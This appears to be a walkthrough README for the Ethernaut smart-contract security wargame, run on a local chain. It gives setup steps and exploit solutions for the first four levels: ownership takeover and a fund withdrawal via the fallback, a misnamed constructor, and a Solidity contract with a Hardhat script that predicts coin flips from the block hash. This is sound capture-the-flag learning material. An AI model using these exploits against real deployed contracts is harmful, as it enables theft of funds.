# Ethernaut

## Setup

Install and run locally, since the version on https://ethernaut.openzeppelin.com is in read-only mode

```sh
# Install nvm

git clone https://github.com/OpenZeppelin/ethernaut.git
cd ethernaut

nvm install # Use the version specified in .nvmrc
nvm use
npm install --global yarn
yarn install

# Launch a local network (in a separate shell) with `yarn network`
# Import one of the private keys into MetaMask

# Verify ACTIVE_NETWORK = NETWORKS.LOCAL in client/src/constants.js
yarn deploy:contracts
# It may be necessary to explicitly change http://localhost to http://127.0.0.1 in client/src/constants.js
# (Most /etc/hosts include an ipv6 entry for localhost which can apparently cause problems)
yarn start:ethernaut
```

## 00 Hello Ethernaut

```js
await contract.info()
await contract.info1()
await contract.info2("hello")

// Can tell infoNum() returns a uint8 from contract.abi
(await contract.infoNum()).toString()

await contract.info42()
await contract.theMethodName()
await contract.method7123949()
await contract.password()
await contract.authenticate("ethernaut0")
```

## 01 Fallback

```js
(await contract.contributions(await contract.owner())).toString()
await contract.contribute({value: 1})
(await contract.contributions(player)).toString()
await sendTransaction({to: contract.address, from: player, value: 1})
await contract.owner() == player
await contract.withdraw()
await getBalance(contract.address) == 0
```

## 02 Fallout

```js
// The Fal1out (sp) function is not a constructor
await contract.owner()
await contract.Fal1out()
await contract.owner() == player
```

## 03 Coin Flip

Create a Hardhat project

```sh
mkdir 03-coin-flip
cd 03-coin-flip
npm init
npm install -D hardhat
npx hardhat # Create a JavaScript project
```

With the following contract

```sol
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    ICoinFlip public target;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;
        target.flip(side);
    }
}
```

Compile with `npx hardhat compile`

Create a deploy/execute script (as scripts/deploy.js)

```js
const hre = require("hardhat");

async function main() {
  const target = "<target contract address>";
  const contract = await hre.ethers.deployContract("CoinFlipAttack", [target]);
  await contract.waitForDeployment();
  console.log(`Contract address: ${await contract.getAddress()}`);

  for (let i=0; i<10; i++) {
    (await contract.attack()).wait();
    console.log(`Attack ${i+1} complete`);
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

Include the local network in hardhat.config.js

```js
module.exports = {
  // ...
  networks: {
    ethernaut: {
      url: "http://127.0.0.1:8545",
      chainId: 1337,
      accounts: ["<private key>"]
    }
  }
}
```

Deploy/execute the contract with `npx hardhat run scripts/deploy.js --network ethernaut`

Can verify with `await contract.consecutiveWins() == 10` in the Ethernaut Javascript console

Note that when submitting the instance in the Ethernaut interface will need to update the nonce used by MetaMask since transactions occurred using Hardhat.  Enable this for the account in Settings, Advanced, Customize transaction nonce.
